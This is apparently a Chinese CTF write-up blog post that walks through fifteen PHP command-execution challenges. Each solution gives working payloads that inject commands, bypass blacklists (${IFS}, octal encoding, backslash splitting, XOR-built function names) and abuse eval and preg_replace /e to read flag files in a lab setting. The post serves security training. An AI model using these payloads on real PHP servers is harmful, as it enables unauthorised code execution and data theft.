---

title: 青岑CTF命令执行wp
date: 2026-07-21
categories: ["CTF-Writeups","青岑CTF-WP集"]
permalink: /ctf-writeups/ctf-command-exec
---


# 1.EZCMD
`<?php   
error_reporting(0);  
if (isset($_POST['cmd'])) {   
$cmd = escapeshellcmd($_POST['cmd']); 
system($cmd);   }  
show_source(__FILE__);  
?>`
#escapeshellcmd（）：**对字符串中可能被 shell 解释为命令或参数的字符进行转义**
它会转义的字符包括：`&`, `;`, `` ` ``, `|`, `*`, `?`, `~`, `<`, `>`, `^`, `(`, `)`, `[`, `]`, `{`, `}`, `$`, `\`, `\x0A` (换行), `\xFF` 等
#### 解：
post方式传入cmd
cmd=ls 然后一直查看上一级
cmd=ls ../../../
看到flag
执行cmd=ls ../../../flag

# 2.EZCMD_1
`<?php  

error_reporting(0);  
if (isset($_POST['cmd'])) { 
	$cmd = $_POST['cmd']; 
	system("ping -c 5 ".$cmd);  
}   
show_source(__FILE__);  
?>`

#### 解：
system()函数执行系统命令
用户输入的 $cmd 直接拼接到 ping -c 5 后面  
cmd=127.0.0.1; ls  
只回显了index.php  
继续上级目录  
cmd=| ls  
cmd=| ls ../  
cmd=| ls ../../../ 发现flag,之后cat  
cmd=| cat ../../../flag

# 3.EZCMD_2
`<?php   
error_reporting(0); 
if (isset($_POST['cmd'])) {  
$cmd = $_POST['cmd'];  
system($cmd." >/dev/null 2>&1"); 
} 
show_source(__FILE__);  
?>`

#### 解：
使用 system() 函数执行用户输入的命令，命令输出被重定向到 /dev/null 2>&1 ，但可以通过命令分隔符绕过
先确定是什么系统
cmd=uname -a; echo---是linux # -a是显示所有可获得的系统信息
查看目录
cmd=pwd； echo
查看目录内容
cmd=ls -la； echo # ls -la长格式 + 显示所有文件（含隐藏）
查看根目录
cmd=ls -la /； echo---发现flag
查看flag
cmd=cat /flag； echo

# 4.EZCMD_3

`<?php   
error_reporting(0); 
if (isset($_POST['cmd'])) {   
$cmd = $_POST['cmd'];    
if (strpos($cmd, ' ') !== false) {   
die('no space allowed');   
}    system($cmd." >/dev/null 2>&1");  
}   
show_source(__FILE__);  
?>`

#### 解：
die('no space allowed');  这里将空格过滤了
我们可以用${IFS}来代替空格，步骤和上一题一样

# 5.EZCMD_4
题目名为robot，很容易想到robots.txt，然后我们得到4atP5Aup.php
`<?php   
error_reporting(0); 
if (isset($_POST['cmd'])) { 
$cmd = escapeshellcmd($_POST['cmd']);       if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i', $cmd)) {    
system($cmd);   
	}  
}   show_source(__FILE__);   
?>`

#### 解：
这里过滤了很多东西，不过还是有一些没有被过滤的
- `php` - PHP解释器
- `python`/`python3` - Python解释器
- `perl` - Perl解释器
- `tee` - 写入文件
- `rev` - 反转字符串
- `od` 虽然被过滤，但可以用 `hexdump`
当然，该黑名单也没有过滤 \ 所以我们可以使用这个来绕过一下字符
我试了很多payload，终于在cmd=php -r print_r(`l\\s`)时有回显，
然后构造cmd=php -r print_r(\`l\\s -l\\a\`);时，报错了一堆，问了ai才知道问题出在**空格**和**特殊字符转义**上，ai给了< 或 >重定向和/t制表符，最终cmd=php -r print_r(`l\\s\t-l\\a`);成功读取了目录结构，然后使用php -r print_r()和反引号、\来构造相应的paload
先确定是什么系统
cmd=php -r print_r(`un\\ame\t-a`);---是linux # -a是显示所有可获得的系统信息
查看目录
cmd=php -r print_r(`p\\wd`);
查看目录内容
cmd=php -r print_r(`l\\s\t-l\\a\t/`);# ls -la长格式 + 显示所有文件（含隐藏）
查看flag
cmd=php -r print_r(`c\\at\t/fl\\ag`);
#### 注：
该题中的'和"都被过滤了，正常 PHP 代码需要引号，但是-r参数把后面所有内容当作 PHP 代码直接解析，不经过 shell 的引号解析



# 6.EZCMD_5
`<?php   
//flag在/flag.txt文件中
error_reporting(0); 
if (isset($_POST['cmd'])) {  
$cmd = $_POST['cmd'];     
if (preg_match('/[a-zA-Z]/', $cmd)) {           
die('no letter allowed');       }   
system($cmd);   } 
show_source(__FILE__);  
?>`

#### 解：
preg_match('/[a-zA-Z]/', $cmd)这里过滤了所有字母
所以我们可以通过**ANSI-C 引用的八进制编码**方式绕过字母限制
我们想执行ls /flag.txt，所以用$ $'\154\163' /$'\146\154\141\147\56\164\170\164'
然后我们用cat /flag.txt,所以用$ $'\143\141\164' /$'\146\154\141\147\56\164\170\164'
得到flag

# 7.EZCMD_6
`<?php 
@eval($_POST['qc']);  
show_source(__FILE__);   
?>`

#### 解：
这里是一句话木马，第一次使用蚁剑连接好像没有什么发现
于是直接post传参来命令执行
先确定是什么系统
qc=system('uname -a'); ---是linux # -a是显示所有可获得的系统信息
查看目录
qc=system('pwd')； 
查看目录内容
qc=system('ls -la')；  # ls -la长格式 + 显示所有文件（含隐藏）
查看根目录
qc=system('ls -la /')；---发现flag
查看flag
qc=system('cat /flag')；
# 8.EZCMD_7
`<?php 
error_reporting(0); 
if(isset($_GET['qc'])){    
$qc = $_GET['qc'];    
if(!preg_match("/flag/i", $qc)){
eval($qc);       } 
}else{  
highlight_file(__FILE__);   }   
?>`
#### 解：
if(!preg_match("/flag/i", $qc))这里的flag被过滤了 ，我们可以使用通配符来绕过，空格也被过滤了
get传参先确定是什么系统
?qc=system('uname -a'); ---是linux # -a是显示所有可获得的系统信息
查看目录
?qc=system('pwd')； 
查看目录内容
?qc=system('ls -la')；  # ls -la长格式 + 显示所有文件（含隐藏）
查看根目录
?qc=system('ls -la /')；---发现flag
查看flag
?qc=system('cat%20/fla?');
# 9 .EZCMD_8
`<?php  
error_reporting(0);   
if(isset($_GET['qc'])){   
$qc = $_GET['qc'];  
if(!preg_match("/flag|system/i", $qc)){ 
eval($qc);       }   
}else{    highlight_file(__FILE__); 
}   
?>`

#### 解：
if(!preg_match("/flag|system/i", $qc))
这里把flag和system都过滤了，还有空格
?qc=passthru('uname%09-a'); ---是linux # -a是显示所有可获得的系统信息
查看目录
?qc=passthru('pwd')； 
查看目录内容
?qc=passthru('ls%09-la')；  # ls -la长格式 + 显示所有文件（含隐藏）
查看根目录
?qc=passthru('ls%09-la%09/')；---发现flag
查看flag
?qc=passthru('cat%20/fla?');
也把system换成echo file_get_contents
最后的payload?qc=echo%20file_get_contents('/f'.'lag');

# 10.EZCMD_9
`<?php   
error_reporting(0);  
if(isset($_GET['qc'])){    
$qc = $_GET['qc'];    
if(!preg_match("/system| /i", $qc)){  
eval($qc);      
}   }else{    highlight_file(__FILE__); } 
?>`

#### 解：
if(!preg_match("/system| /i", $qc))
这里绕过了system，还有空格
我们可以拼接绕过$ a="sys";$ b="tem";$ c=$ a.$ b;$c，passthru绕过，
hex/八进制编码绕过"\x73\x79\x73\x74\x65\x6d"等
?qc=passthru('uname%09-a'); ---是linux # -a是显示所有可获得的系统信息
查看目录
?qc=passthru('pwd')； 
查看目录内容
?qc=passthru('ls%09-la')；  # ls -la长格式 + 显示所有文件（含隐藏）
查看根目录
?qc=passthru('ls%09-la%09/')；---发现flag
查看flag
?qc=passthru('cat%09/flag');
# 11.EZCMD_10
`<?php
error_reporting(0);  
if(isset($_GET['qc'])){    
$qc = $_GET['qc'];     
if(!preg_match("/;/i", $qc)){ 
eval($qc);       }   }
else{  
highlight_file(__FILE__);   }  
?>`

#### 解：
只禁用了' ；'可以使用'?>'来绕过
可以和上面的题目一样只是把；换成?>
也可用使用?qc=echo file_get_contents('/flag.txt')?>直接得到flag

# 12.EZCMD_11
`<?php  
//flag在flag.php文件中
error_reporting(0);
if(isset($_GET['qc'])){   
$qc = $_GET['qc'];       if(!preg_match("/;/i", $qc)){ 
eval($qc);     
}       }else{    
highlight_file(__FILE__);   }  
?>`

#### 解：
这里只禁用了‘；’，可以使用‘?>’来绕过，和上一题不同的是，上一题是txt这里是php，所以使用?qc=show_source('flag.php')?>直接读取flag，或者?qc=highlight_file('flag.php')?>
#### 题目对比

|        | 上一题            | 这一题                  |
| ------ | -------------- | -------------------- |
| flag位置 | /flag.txt(根目录) | flag.php(当前目录)       |
| 文件类型   | txt            | php                  |
| 读取方式   | 直接读取           | 直接读取会执行php代码，可能看不到源码 |

#### 核心区别：`.php` vs `.txt`
##### `.txt` 文件
- 就是纯文本
- `cat /flag.txt` 或 `file_get_contents('/flag.txt')` 直接看到内容
##### `.php` 文件
- 如果直接用命令 `cat flag.php`，看到的是**源码** ✅
- 但如果用浏览器访问或某些函数，会**执行 PHP** 而不是显示源码
- 如果 `flag.php` 执行后没有输出，你就看不到 flag
# 13.EZCMD_12
`<?php
//flag在flag.php文件中
error_reporting(0);  
if (isset($_GET['qc'])) {    
$qc = $_GET['qc'];       if (!preg_match("/['\"\?<>\.\$\{\}:\\\\~^@*\-+=\[\]\,]/", $qc)) { 
eval($qc);       }   } 
else {    highlight_file(__FILE__);   } 
?>`

#### 解：
if (!preg_match("/['\"\?<>\.\$\{\}:\\\\~^@*\-+=\[\]\,]/", $qc)) 

这里过滤很多字符，所以像cat /flag.php和‘flag.php’就不能使用，所以我们可以使用base64编码绕过，但是base64编码过后还会有==  ，=被过滤了，所以可以使用base64_decode来绕过，因为源码告诉了我们flag在flag.php里面，所以直接使用?qc=show_source(base64_decode(ZmxhZy5waHA));就可以拿到flag。
#### 注：
base64和base64_decode的区别，其实没有区别，就是`base64_decode` 解码 是没有 `=` 的 base64
# 14.EZCMD_13
`<?php
$ re = isset($_GET['re']) ? $_GET['re'] : '';   
$ str = isset($_GET['str']) ? $_GET['str'] : '';    
if ($re === '' || $str === '') {    
highlight_file(__FILE__);       exit;   }     
echo preg_replace(    
'/(' . $re . ')/ei',    '
strtolower("\\1")',   
$str   );``

#### 注：
这是一个 **preg_replace /e 模式代码执行** 的经典题目
**preg_replace**:是 PHP 中用于执行**正则表达式**的搜索和替换的函数。它的功能比 `str_replace()` 更强大，可以处理复杂的模式匹配。
**基本语法**：==preg_replace( mixed $pattern, mixed $replacement, mixed $subject, int $ limit = -1, int &$count = null ): mixed==
###### 参数说明：
- **$pattern**: 要搜索的正则表达式模式（可以是字符串或字符串数组）
- **$replacement**: 用于替换的字符串或字符串数组
- **$subject**: 要搜索替换的目标字符串或字符串数组
- **$limit**: 可选，每个主题字符串的最大替换次数，默认 -1（无限制）
- **$count**: 可选，返回被替换的次数
###### 关键点
- `/e` 修饰符：将替换字符串作为 **PHP 代码执行**（危险！）
- `\\1` 反向引用第一个捕获组
- `strtolower("\\1")` 是替换内容，会被 **eval 执行**
#### 解：
##### 步骤 1：确认漏洞存在
测试 `/e` 是否有效：

```plain
?re=(.*)&str=phpinfo()
```

如果回显 `phpinfo()` 字符串 → `/e` 被禁用（PHP 7+） 如果执行了 phpinfo 页面 → `/e` 有效
**实际情况：** 回显字符串，说明需要利用 **复杂变量语法 `{${}}`**
##### 步骤 2：利用复杂变量语法执行代码

```plain
?re=(.*)&str={${phpinfo()}}
```

**原理：** `{${...}}` 在双引号字符串中解析时会执行表达式

##### 步骤 3：解决引号转义问题
直接写引号会被转义：

```plain
{${system('cat /flag')}}  →  报错：\' 被转义
```

**绕过方法：用 chr() 拼接**

|字符|ASCII 码|
|:--|:--|
|`/`|47|
|`f`|102|
|`l`|108|
|`a`|97|
|`g`|103|

##### 步骤 4：构造最终 Payload

```plain
?re=(.*)&str={${readfile(chr(47).chr(102).chr(108).chr(97).chr(103))}}
```
##### 注：
对re=(.* )的解释，它是一个**正则表达式模式**，通常用于从URL中提取参数值或进行模式匹配（`re=(.*)` 是 **万能钥匙**）
![](/images/20260417210335.png)
# 15.EZCMD_14
`<?php 
error_reporting(0);  
if(isset($_GET['qc'])){  
$qc = $_GET['qc'];       if(!preg_match("/[a-zA-Z0-9]/", $qc)){ 
eval($qc);       }   
}else{    
highlight_file(__FILE__);   } 
?>`
#### 解：
这里使用**异或 `^`** 是个好方法
?qc=("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%03%01%08%00%00%06%00"^"%60%60%7c%20%2f%60%2a");
